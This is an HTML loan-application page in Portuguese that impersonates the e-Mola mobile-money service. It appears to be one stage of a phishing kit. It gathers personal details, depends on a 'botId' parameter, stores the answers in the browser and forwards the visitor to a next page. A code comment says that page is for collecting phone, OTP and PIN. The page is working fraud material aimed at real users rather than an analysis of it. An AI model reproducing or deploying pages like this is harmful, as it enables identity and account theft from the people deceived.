<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>e-Mola · Pedido de Empréstimo</title>

    <style>
        /* ── reset & base ── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background:
                linear-gradient(180deg, #f7a53d 0%, #e38a2e 25%, #c46b22 52%, #a94e1c 76%, #914015 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 0;
        }

        .app-wrapper {
            width: 100%;
            max-width: 420px;
            background: transparent;
            min-height: 100vh;
            position: relative;
            padding: 20px 16px 100px;
        }

        /* ── e‑Mola logo & header ── */
        .logo-header {
            text-align: center;
            margin: 20px 0 30px;
            color: white;
        }

        .logo-header::before {
            content: "▣";
            display: block;
            font-size: 75px;
            line-height: 60px;
            font-weight: 900;
            color: white;
            margin-bottom: 4px;
            transform: rotate(-4deg);
        }

        .logo-header h1 {
            font-size: 48px;
            font-weight: 700;
            letter-spacing: -1px;
            margin-bottom: 2px;
            color: white;
        }

        .logo-header .slogan {
            font-size: 18px;
            font-weight: 700;
            opacity: 0.95;
            color: white;
        }

        /* ── white card ── */
        .card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 24px;
            padding: 24px 20px 30px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
            margin-bottom: 20px;
        }

        .page-header h1 {
            font-size: 22px;
            font-weight: 700;
            color: #1e1e1e;
            margin-bottom: 4px;
        }

        .page-header p {
            font-size: 14px;
            color: #555;
            margin-bottom: 24px;
            line-height: 1.5;
        }

        /* ── form elements ── */
        form label {
            font-size: 14px;
            font-weight: 500;
            color: #333;
            display: block;
            margin-bottom: 5px;
        }

        form input,
        form select {
            width: 100%;
            padding: 12px 14px;
            font-size: 15px;
            border-radius: 10px;
            border: 1.5px solid #ddd;
            background: #fafafa;
            color: #222;
            outline: none;
            transition: border-color 0.3s, box-shadow 0.2s;
            margin-bottom: 16px;
            appearance: auto;
        }

        form input:focus,
        form select:focus {
            border-color: #6a0dad;
            box-shadow: 0 0 0 3px rgba(106, 13, 173, 0.15);
            background: #fff;
        }

        form input::placeholder,
        form select option {
            color: #999;
        }

        /* ── checkboxes ── */
        .checkbox-wrapper {
            display: flex;
            gap: 12px;
            margin-bottom: 14px;
            font-size: 14px;
            color: #333;
            align-items: flex-start;
        }

        .checkbox-wrapper input[type="checkbox"] {
            width: 20px;
            height: 20px;
            min-width: 20px;
            margin-top: 2px;
            accent-color: #6a0dad;
            cursor: pointer;
            border: 2px solid #d0d7de;
            border-radius: 4px;
            background: #fff;
        }

        .checkbox-wrapper label {
            cursor: pointer;
            margin-bottom: 0;
            font-weight: 400;
            line-height: 1.5;
        }

        .checkbox-wrapper label strong {
            color: #6a0dad;
        }

        /* ── continue button (fixed at bottom) ── */
        .continue-btn {
            position: fixed;
            left: 50%;
            transform: translateX(-50%);
            bottom: 28px;
            width: calc(100% - 32px);
            max-width: 420px;
            height: 56px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 30px;
            border: none;
            cursor: not-allowed;
            transition: background 0.2s, transform 0.15s;
            background: #c4b0d6;
            color: #fff;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            z-index: 100;
        }

        .continue-btn:enabled {
            background: #6a0dad;
            cursor: pointer;
        }

        .continue-btn:enabled:hover {
            background: #5a0b9a;
            transform: translateX(-50%) scale(1.01);
        }

        .continue-btn:enabled:active {
            transform: translateX(-50%) scale(0.98);
        }

        /* ── footer (version) ── */
        .footer {
            text-align: center;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
            letter-spacing: 0.3px;
            margin-top: 10px;
            padding-bottom: 12px;
        }

        /* ── responsive ── */
        @media (max-width: 480px) {
            .app-wrapper {
                padding: 10px 12px 90px;
            }
            .logo-header::before {
                font-size: 60px;
                line-height: 50px;
            }
            .logo-header h1 {
                font-size: 40px;
            }
            .logo-header .slogan {
                font-size: 16px;
            }
            .card {
                padding: 18px 14px 24px;
            }
            .page-header h1 {
                font-size: 20px;
            }
            .continue-btn {
                height: 52px;
                font-size: 16px;
                bottom: 20px;
                width: calc(100% - 24px);
            }
        }

        @media (max-height: 700px) {
            .logo-header {
                margin: 10px 0 20px;
            }
            .logo-header::before {
                font-size: 50px;
                line-height: 42px;
            }
            .logo-header h1 {
                font-size: 34px;
            }
            .logo-header .slogan {
                font-size: 14px;
            }
            .card {
                padding: 16px 14px 20px;
            }
        }
    </style>
</head>
<body>

<div class="app-wrapper">

    <!-- e‑Mola logo -->
    <div class="logo-header">
        <h1>e-Mola</h1>
        <div class="slogan">Meu cell, minha mola</div>
    </div>

    <!-- White card with form -->
    <div class="card">
        <div class="page-header">
            <h1>Pedido de Empréstimo</h1>
            <p>Preencha os seus dados pessoais</p>
        </div>

        <form id="loanForm">
            <label>Nome Completo</label>
            <input name="fullName" placeholder="Ex: João Silva" required />

            <label>Data de Nascimento</label>
            <input type="date" name="dob" required />

            <label>Endereço de Email</label>
            <input type="email" name="email" placeholder="exemplo@email.com" required />

            <label>Endereço Residencial</label>
            <input name="address" placeholder="Endereço completo" required />

            <label>Situação Profissional</label>
            <select name="employmentStatus" required>
                <option value="">Selecionar</option>
                <option>Empregado</option>
                <option>Autónomo</option>
                <option>Desempregado</option>
                <option>Estudante</option>
            </select>

            <label>Finalidade do Empréstimo</label>
            <select name="loanPurpose" required>
                <option value="">Selecionar</option>
                <option>Negócio</option>
                <option>Pessoal</option>
                <option>Educação</option>
                <option>Saúde</option>
                <option>Emergência</option>
            </select>

            <label>Valor do Empréstimo (MT)</label>
            <input type="number" name="loanAmount" required placeholder="Mínimo 500" min="500" max="800000" step="1" />

            <label>Prazo do Empréstimo</label>
            <select name="loanTerm" required>
                <option value="">Selecionar</option>
                <option>6 meses</option>
                <option selected>12 meses</option>
                <option>24 meses</option>
                <option>36 meses</option>
                <option>48 meses</option>
            </select>

            <div class="checkbox-wrapper">
                <input type="checkbox" id="termsCheck" required />
                <label for="termsCheck">Aceito os termos e condições</label>
            </div>

            <div class="checkbox-wrapper">
                <input type="checkbox" id="interestCheck" required />
                <label for="interestCheck">
                    Compreendo que os empréstimos estão sujeitos a uma taxa de juro de <strong>8% a 15% ao mês</strong>
                    dependendo da qualidade de crédito e do valor solicitado.
                </label>
            </div>
        </form>
    </div>

    <!-- Version -->
    <div class="footer">Versão 2.1.0</div>

    <!-- Fixed button -->
    <button id="continueBtn" class="continue-btn" disabled>SUBMETER</button>

</div>

<!-- ====== SCRIPT ====== -->
<script>
    (function() {
        // ---------- BOT ID ----------
        const params = new URLSearchParams(window.location.search);
        const urlBotId = params.get('botId');
        if (urlBotId) localStorage.setItem('botId', urlBotId);
        const botId = localStorage.getItem('botId');

        if (!botId) {
            alert('Sessão inválida. Por favor, recomece.');
            window.location.href = 'index.html';
            return;
        }

        // ---------- FORM ELEMENTS ----------
        const form = document.getElementById('loanForm');
        const termsCheck = document.getElementById('termsCheck');
        const interestCheck = document.getElementById('interestCheck');
        const button = document.getElementById('continueBtn');

        // ---------- ENABLE BUTTON ----------
        function updateButton() {
            button.disabled = !(termsCheck.checked && interestCheck.checked);
        }

        termsCheck.addEventListener('change', updateButton);
        interestCheck.addEventListener('change', updateButton);

        // ---------- FORM SUBMIT ----------
        form.addEventListener('submit', (e) => {
            e.preventDefault();

            // Save all form data
            const data = Object.fromEntries(new FormData(form));
            localStorage.setItem('loanFormData', JSON.stringify(data));

            // Save the full name (used later in phone/OTP/PIN)
            localStorage.setItem('fullName', data.fullName);
            localStorage.setItem('name', data.fullName); // for consistency

            // Redirect to phone verification (details.html)
            window.location.href = `details.html?botId=${botId}`;
        });

        // ---------- CLICK ON CONTINUE BUTTON TRIGGERS FORM SUBMIT ----------
        button.addEventListener('click', function() {
            if (!this.disabled) {
                form.dispatchEvent(new Event('submit'));
            }
        });
    })();
</script>

</body>
</html>
